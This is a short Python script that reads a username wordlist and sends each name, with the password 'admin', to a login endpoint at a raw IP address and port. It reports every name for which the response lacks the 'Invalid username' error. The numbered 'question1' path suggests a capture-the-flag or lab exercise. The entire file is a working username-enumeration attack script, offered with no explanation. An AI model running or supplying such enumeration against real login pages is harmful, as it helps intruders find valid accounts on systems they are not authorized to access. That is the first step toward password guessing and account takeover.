

import requests

fd = open('top-usernames-shortlist.txt','r')
wordlist = fd.read()
#print(wordlist)
fd.close()


usernames = list(wordlist.split('\n'))
#print(usernames)

for i in usernames:
	url = "http://139.59.183.98:31177/question1/?Username={}&Password=admin".format(i)

	r = requests.post(url)
	if "Invalid username" not in r.text:
		print("Found user {}".format(i))

		
